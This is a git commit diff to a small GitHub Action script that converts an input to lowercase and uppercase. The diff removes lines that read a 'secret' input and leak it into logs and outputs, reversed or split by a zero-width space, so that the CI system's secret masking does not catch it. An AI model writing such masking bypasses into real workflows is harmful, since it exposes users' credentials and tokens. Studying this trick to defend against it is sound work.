fe3f7be878c7b34e8233717c0f69194f942e8816
Simran Spiller <simran.spiller@gmail.com>
2020-11-13 19:43:31 +0100

    Fixes

--- local/dist/index.js
+++ local/dist/index.js
@@ -9,13 +9,10 @@ const core = __webpack_require__(186)
 
 async function run() {
     try {
-        const secret = core.getInput("secret")
-        core.setFailed(`Leak reversed secret: ${ secret.split('').reverse().join('') }`)
         const value = core.getInput("value")
         core.info(`Input: value = ${value}`)
         core.setOutput("lower", value.toLowerCase())
         core.setOutput("upper", value.toUpperCase())
-        core.setOutput("leak", `${ secret[0] }\u200b${ secret.slice(1) }`)
     } catch (error) {
         core.setFailed(error.message)
     }
